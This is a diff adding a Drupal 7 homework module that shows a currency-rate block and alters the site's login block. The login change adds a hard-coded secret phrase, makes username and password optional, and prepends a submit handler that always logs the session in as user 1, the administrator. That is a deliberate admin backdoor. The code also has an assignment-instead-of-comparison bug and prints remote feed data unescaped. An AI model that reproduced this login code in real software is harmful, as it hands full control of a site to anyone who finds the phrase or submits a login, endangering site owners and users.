@@ -1,0 +1,190 @@
+<?php
+
+/**
+ * @file
+ * Homework on topic Block and Menu.
+ */
+
+/**
+ * Secret key to login without username and password.
+ */
+define('TRAINING2_FORM_SECRET_KEY', 'сим-сим откройся');
+
+/**
+ * Url with current exchange rates.
+ */
+define('TRAINING2_FORM_NBRB_RATES_XML', 'http://www.nbrb.by/Services/XmlExRates.aspx');
+
+/**
+ * Implements hook_block_info().
+ */
+function training2_form_block_info() {
+  $blocks['currency'] = array(
+    'info' => t('Currency block'),
+    'cache' => DRUPAL_CACHE_GLOBAL,
+  );
+
+  return $blocks;
+}
+
+/**
+ * Implements hook_block_configure().
+ */
+function training2_form_block_configure($delta = '') {
+  $form = array();
+
+  if ($delta = 'currency') {
+    $currency = training2_form_conf_content();
+
+    $form['form_currency'] = array(
+      '#type' => 'checkboxes',
+      '#title' => t('Choose currencies'),
+      '#options' => drupal_map_assoc($currency),
+    );
+  }
+
+  return $form;
+}
+
+/**
+ * Implements hook_block_save().
+ */
+function training2_form_block_save($delta = '', $edit = array()) {
+
+  if ($delta == 'currency') {
+    if (!empty($edit['form_currency'])) {
+      variable_set('form_currency', $edit['form_currency']);
+    }
+  }
+}
+
+/**
+ * Implements hook_block_view().
+ */
+function training2_form_block_view($delta = '') {
+  $block = array();
+
+  switch ($delta) {
+    case 'currency':
+      $block['subject'] = t('Currency');
+      $block['content'] = training2_form_content();
+      break;
+  }
+
+  return $block;
+}
+
+/**
+ * Function drupal_map_assoc() uses return array.
+
+ * @return array
+ *   Return array which includes CharCode and Rate.
+ */
+function training2_form_conf_content() {
+  $xml_array = training2_form_get_xml_data();
+  $array_currency = $xml_array['Currency'];
+
+  $arr_value = array();
+  $n = count($array_currency);
+  for ($i = 0; $i < $n; $i++) {
+    $arr_value[$i] = $array_currency[$i]['CharCode'] . ' - ' . $array_currency[$i]['Rate'];
+  }
+  return $arr_value;
+}
+
+/**
+ * Transformation XML.
+ *
+ * @return mixed
+ *   Return array currency.
+ */
+function training2_form_get_xml_data() {
+  $xml_data = simplexml_load_file(TRAINING2_FORM_NBRB_RATES_XML);
+  $json_data = json_encode($xml_data);
+
+  return json_decode($json_data, TRUE);
+}
+
+/**
+ * Display block content.
+ */
+function training2_form_content() {
+  $xmlArray = training2_form_get_xml_data();
+  $date = $xmlArray['@attributes']['Date'];
+  $choose = variable_get('form_currency');
+  $choose_currency = '';
+  if (is_array($choose)) {
+    $clean_array = array_diff($choose, array(0));
+    $choose_currency = implode($clean_array, '<br />');
+  }
+  $dated = date('d-m-Y H:i:s');
+  $result = $date . '<br />' . $choose_currency . '<br /><br />' . $dated;
+
+  return $result;
+}
+
+/**
+ * Implements hook_form_FORM_ID_alter().
+ */
+function training2_form_form_user_login_block_alter(&$form, &$form_state, $form_id) {
+  $form['secret_key'] = array(
+    '#type' => 'textfield',
+    '#title' => t('Secret Key'),
+    '#size' => 15,
+    '#weight' => 0,
+  );
+  $form['name']['#required'] = FALSE;
+  $form['pass']['#required'] = FALSE;
+  $form['#validate'][] = 'training2_form_form_user_login_block_validate';
+  array_unshift($form['#submit'], 'training2_form_form_user_login_block_submit');
+
+  return $form;
+}
+
+/**
+ * Validate new login form.
+ *
+ * @param array $form
+ *   Nested array of new login form elements.
+ * @param array $form_state
+ *   A keyed array containing the current state of the new login form.
+ */
+function training2_form_form_user_login_block_validate($form, &$form_state) {
+
+  if ($form_state['values']['secret_key'] != '') {
+    if ($form_state['values']['secret_key'] == TRAINING2_FORM_SECRET_KEY) {
+      form_clear_error();
+      drupal_get_messages();
+    }
+    else {
+      form_set_error('text', t('Secret key is incorrect.'));
+    }
+  }
+}
+
+/**
+ * Submit handler for user_login_block.
+ *
+ * @param array $form
+ *   Nested array of new login form elements.
+ * @param array $form_state
+ *   A keyed array containing the current state of the new login form.
+ */
+function training2_form_form_user_login_block_submit($form, &$form_state) {
+  global $user;
+  $form_state['uid'] = 1;
+  $user = user_load($form_state['uid']);
+  user_login_finalize($form_state);
+}
+
+/**
+ * Implements hook_theme().
+ */
+function training2_form_theme() {
+  $items['user_login_block'] = array(
+    'render element' => 'form',
+    'template' => 'templates/training2_form_login_template',
+  );
+
+  return $items;
+}
